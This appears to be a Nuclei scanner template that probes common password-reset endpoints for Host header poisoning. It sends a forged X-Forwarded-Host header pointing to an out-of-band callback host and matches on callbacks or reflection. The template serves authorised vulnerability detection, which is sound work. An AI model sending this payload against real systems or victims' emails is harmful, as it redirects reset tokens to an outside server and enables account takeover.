id: password-reset-host-poisoning

info:
  name: Password Reset - Host Header Poisoning via OOB
  author: bugscanner
  severity: high
  description: |
    Password reset endpoint is vulnerable to Host header poisoning via
    X-Forwarded-Host injection. If the application uses this header when
    constructing the reset link in the email, the attacker can redirect
    victims' reset tokens to an attacker-controlled server.
    Detected via interactsh OOB HTTP callback.
  reference:
    - https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
  tags: custom,host-header,account-takeover,interactsh,oast,password-reset

http:
  - method: POST
    path:
      - "{{BaseURL}}/forgot-password"
      - "{{BaseURL}}/forgot_password"
      - "{{BaseURL}}/password/reset"
      - "{{BaseURL}}/password/forgot"
      - "{{BaseURL}}/account/reset"
      - "{{BaseURL}}/auth/forgot-password"
      - "{{BaseURL}}/auth/password-reset"
      - "{{BaseURL}}/user/reset-password"
      - "{{BaseURL}}/users/password"
      - "{{BaseURL}}/api/v1/auth/forgot-password"
      - "{{BaseURL}}/api/forgot-password"
      - "{{BaseURL}}/api/password-reset"
      - "{{BaseURL}}/api/auth/reset"

    headers:
      Content-Type: application/json
      X-Forwarded-Host: "{{interactsh-url}}"

    body: '{"email":"test@bugscanner.example.com"}'

    matchers-condition: or
    matchers:
      # OOB: app made an HTTP request to our interactsh URL (e.g. email preview, link validation)
      - type: word
        part: interactsh_protocol
        words:
          - "http"
        name: oob-http-callback

      # Inline: the poisoned host was reflected directly in the response body
      - type: word
        part: body
        words:
          - "{{interactsh-url}}"
        name: reflected-in-response
